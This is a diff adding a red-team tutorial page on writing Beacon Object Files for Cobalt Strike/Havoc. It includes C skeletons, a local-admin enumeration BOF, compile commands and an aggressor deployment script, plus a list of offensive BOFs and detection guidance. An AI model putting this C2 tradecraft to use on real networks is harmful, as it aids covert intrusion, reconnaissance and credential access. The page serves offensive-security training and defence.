@@ -1,0 +1,286 @@
+---
+title: Beacon Object File (BOF) Development
+mitre: T1059.006
+category: loaders
+group: In-Memory Execution
+summary: Write position-independent C code that executes inside a Cobalt Strike or Havoc beacon process without spawning a new process or touching disk.
+platform: [Windows]
+tags: ['C / C++', 'COFF', 'Cobalt Strike']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: compile C code as a COFF object file
+    desc: The BOF is a standard Windows COFF (.obj) file compiled without linking. No entry point, no imports, no standard library.
+    dll: —
+  - call: beacon loads and relocates the COFF in-process
+    desc: The C2 agent allocates RWX memory, copies the COFF sections, applies relocations, and resolves external symbols via the beacon API.
+    dll: —
+  - call: beacon calls go() entry point
+    desc: The beacon executes go(char *args, int len) — the BOF receives its arguments as a packed buffer and runs inside the beacon's process.
+    dll: —
+  - call: BOF calls beacon APIs for output
+    desc: Use BeaconPrintf / BeaconOutput to send results back to the operator. All WinAPI calls go through BEACON_GETDLL_FUNC macros.
+    dll: —
+  - call: beacon frees BOF memory after return
+    desc: When go() returns, the beacon frees the COFF memory. No persistent thread, no new process.
+    dll: —
+detections:
+  - src: MEMORY SCAN
+    text: Short-lived RWX or RX allocation inside an existing beacon process that appears and disappears within seconds.
+  - src: ETW-TI
+    text: VirtualAlloc of executable memory inside a long-running process not associated with a module load — followed immediately by a free.
+  - src: BEHAVIOURAL
+    text: Beacon process executing privileged operations (credential access, lateral movement) without spawning a child process — anomalous for the parent's normal behaviour.
+  - src: YARA
+    text: COFF header magic (0x4550 is PE; COFF uses 0x4C01 for x86 or 0x8664 for x64) in an allocated heap region.
+related:
+  - mitre: T1027.009
+    title: Donut Shellcode Generation
+    desc: Donut converts arbitrary PE and .NET to shellcode, complementing the BOF model for tools that are not BOF-native.
+    href: /techniques/loaders/donut-shellcode
+  - mitre: T1027.009
+    title: Encrypted Shellcode Loader
+    desc: Use the shellcode loader as the initial stager that delivers the beacon and BOFs.
+    href: /techniques/loaders/shellcode-loader
+  - mitre: T1036.005
+    title: Call Stack Spoofing
+    desc: BOF execution has a distinctive call stack; stack spoofing hides the origin of BOF-made API calls.
+    href: /techniques/evasion/call-stack-spoofing
+labKit:
+  - label: CS-Situational-Awareness-BOF (TrustedSec)
+    href: 'https://github.com/trustedsec/CS-Situational-Awareness-BOF'
+  - label: BOF.NET (managed code in BOFs)
+    href: 'https://github.com/CCob/BOF.NET'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+A **Beacon Object File (BOF)** is a position-independent COFF object file that the Cobalt Strike (or compatible) beacon loads, relocates, and executes in-process. The key operational advantage is that BOFs run **without spawning a child process** — everything executes inside the already-running beacon, which means no new process creation events (Sysmon EID 1), no `CreateRemoteThread`, and no `fork`-and-run noise.
+
+BOFs are compiled with standard C compilers but linked as object files (not executables). The beacon acts as a custom loader: it allocates memory, maps COFF sections, applies relocations, resolves any external DLL symbols using the beacon's internal `BeaconGetDLL` / `FUNC_DEF` macros, and calls the `go()` entry point.
+
+BOFs have become the de-facto standard for extending C2 capability without detection surface: almost every modern offensive capability (token theft, LDAP queries, process injection, credential access) has a BOF implementation.
+
+<Callout type="note">
+  BOFs are intentionally minimal — no CRT, no standard library, no exceptions. Every function
+  call must go through a dynamic resolution macro (`BEACON_GETDLL_FUNC`) so the beacon can
+  resolve the address at runtime. This means `printf` does not work; use `BeaconPrintf` instead.
+  Stack allocations work normally; heap allocations require explicit `VirtualAlloc` or
+  `HeapAlloc` since there is no `malloc`.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Minimal BOF skeleton
+
+<CodeBlock
+  file="bof_skeleton.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include "beacon.h"   // Cobalt Strike BOF headers (from CS SDK)
+
+// Dynamic import macro — resolves a function from a DLL at runtime
+// Usage: GETPROCADDRESS(kernel32, GetCurrentProcessId)
+//   declares: GETPROCADDRESS_T kernel32$GetCurrentProcessId
+
+// WinAPI calls from a BOF must go through the BEACON_GETDLL_FUNC macros
+// so the beacon can resolve them. Direct imports would break COFF relocation.
+
+// Declare the functions we'll use (beacon convention: DllName$FunctionName)
+DECLSPEC_IMPORT DWORD WINAPI kernel32$GetCurrentProcessId(void);
+DECLSPEC_IMPORT HANDLE WINAPI kernel32$GetCurrentProcess(void);
+DECLSPEC_IMPORT BOOL WINAPI kernel32$CloseHandle(HANDLE);
+
+// The beacon unpacks arguments with the bof_pack helpers
+// datap is a packed argument buffer; use BeaconDataExtract / BeaconDataInt etc.
+
+// Entry point: the beacon calls go(args, len)
+void go(char *args, int len) {
+    // Parse arguments
+    datap parser;
+    BeaconDataParse(&parser, args, len);
+
+    // Example: read a string argument
+    char *target_name = BeaconDataExtract(&parser, NULL);
+
+    // Call WinAPI through the beacon's resolver
+    DWORD pid = kernel32$GetCurrentProcessId();
+
+    // Send output back to the operator console
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[BOF] Running in PID %lu\\n", pid);
+
+    if (target_name && *target_name) {
+        BeaconPrintf(CALLBACK_OUTPUT,
+            "[BOF] Target: %s\\n", target_name);
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "[BOF] Complete\\n");
+}`}
+/>
+
+### BOF that queries local admins (real-world example pattern)
+
+<CodeBlock
+  file="local_admins_bof.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+#include <lm.h>
+#include "beacon.h"
+
+// NetLocalGroupGetMembers - resolves at runtime through beacon
+DECLSPEC_IMPORT NET_API_STATUS WINAPI netapi32$NetLocalGroupGetMembers(
+    LPCWSTR servername, LPCWSTR localgroupname, DWORD level,
+    LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread,
+    LPDWORD totalentries, PDWORD_PTR resumehandle);
+
+DECLSPEC_IMPORT NET_API_STATUS WINAPI netapi32$NetApiBufferFree(LPVOID Buffer);
+
+void go(char *args, int len) {
+    LOCALGROUP_MEMBERS_INFO_3 *members = NULL;
+    DWORD entries_read = 0, total_entries = 0;
+    DWORD_PTR resume = 0;
+
+    NET_API_STATUS status = netapi32$NetLocalGroupGetMembers(
+        NULL,          // local computer
+        L"Administrators",
+        3,             // level 3 = domainandname
+        (LPBYTE*)&members,
+        MAX_PREFERRED_LENGTH,
+        &entries_read, &total_entries, &resume);
+
+    if (status != NERR_Success) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "NetLocalGroupGetMembers failed: %lu\\n", status);
+        return;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT,
+        "[*] Local Administrators (%lu entries):\\n", total_entries);
+
+    for (DWORD i = 0; i < entries_read; i++) {
+        // Convert wchar to char for BeaconPrintf
+        char name[256];
+        WideCharToMultiByte(CP_UTF8, 0,
+            members[i].lgrmi3_domainandname, -1,
+            name, sizeof name, NULL, NULL);
+        BeaconPrintf(CALLBACK_OUTPUT, "  %s\\n", name);
+    }
+
+    netapi32$NetApiBufferFree(members);
+}`}
+/>
+
+### Compile and load the BOF
+
+<CodeBlock
+  file="compile_bof.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Compile as a COFF object (no link step)
+# MinGW cross-compiler from Linux:
+x86_64-w64-mingw32-gcc -c bof_skeleton.c \
+    -o bof_skeleton.x64.o \
+    -masm=intel \
+    -Wall \
+    -I ./include   # path to beacon.h
+
+# Verify: should show COFF header, not PE
+file bof_skeleton.x64.o
+# Output: bof_skeleton.x64.o: MS Windows COFF x86-64 object file
+
+# Alternative: MSVC (from a Windows dev environment)
+# cl /c bof_skeleton.c /GS- /Fo:bof_skeleton.x64.obj /I include
+
+# Load in Cobalt Strike (aggressor script or inline-execute):
+# beacon> inline-execute /path/to/bof_skeleton.x64.o arg1 arg2
+
+# Compile for x86 too:
+i686-w64-mingw32-gcc -c bof_skeleton.c -o bof_skeleton.x86.o -masm=intel`}
+/>
+
+### Aggressor script to deploy a BOF
+
+<CodeBlock
+  file="deploy_bof.cna"
+  label="text"
+  lang="text"
+  class="mb-7.5"
+  code={`# Cobalt Strike aggressor script to register and call a BOF
+# Place in scripts/ directory and load in CS script manager
+
+alias local-admins {
+    # $1 = beacon handle
+    local('$handle $bof $args');
+    $handle = $1;
+
+    # Read the BOF file
+    $bof = openf(script_resource("local_admins_bof.x64.o"));
+    $bof = readb($bof, -1);
+    closef($bof);
+
+    # Pack arguments (empty in this case)
+    $args = bof_pack("z", "");  # z = null-terminated string
+
+    # Execute the BOF in the beacon
+    beacon_inline_execute($handle, $bof, "go", $args);
+
+    blog($handle, "[*] local-admins BOF launched");
+}
+
+# Register the alias so it shows up in the beacon console
+beacon_command_register("local-admins",
+    "List local administrator group members via BOF",
+    "Usage: local-admins\\nLists members of the local Administrators group.");`}
+/>
+
+## BOF anatomy
+
+| Component | Description |
+|---|---|
+| COFF `.text` section | Position-independent code; beacon applies relocations |
+| No `.idata` (import) section | All WinAPI calls resolved via `DECLSPEC_IMPORT` + beacon runtime |
+| `go(char *args, int len)` | Required entry point; beacon calls this with packed args |
+| `beacon.h` | Cobalt Strike SDK header defining `BeaconPrintf`, `datap`, etc. |
+| Packed arguments | `bof_pack` in aggressor script → `BeaconDataExtract` in BOF |
+| CALLBACK_OUTPUT | Console output channel; also CALLBACK_ERROR, CALLBACK_PENDING |
+
+## Common BOF capabilities
+
+| Category | BOF | Description |
+|---|---|---|
+| Recon | `SA-whoami` | Token, privileges, integrity level |
+| Recon | `SA-nslookup` | DNS resolution in-process |
+| Recon | `ldapsearch` | LDAP queries without spawning dsquery |
+| Priv Esc | `ElevateKit` | Named pipe token impersonation |
+| Lateral | `jump wmi-bof` | WMI lateral movement without new process |
+| Creds | `Kerberoast-BOF` | In-process Kerberoasting |
+| AV Bypass | `unhook-bof` | NTDLL unhooking in-process |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The primary detection challenge for BOFs is that they leave minimal forensic traces: no child process, no file on disk, typically no persistent thread. The most effective detection is a kernel-level hook that fires on every `VirtualAlloc(MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_*)` call and then tracks whether the allocated region contains COFF-like content before it is freed.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
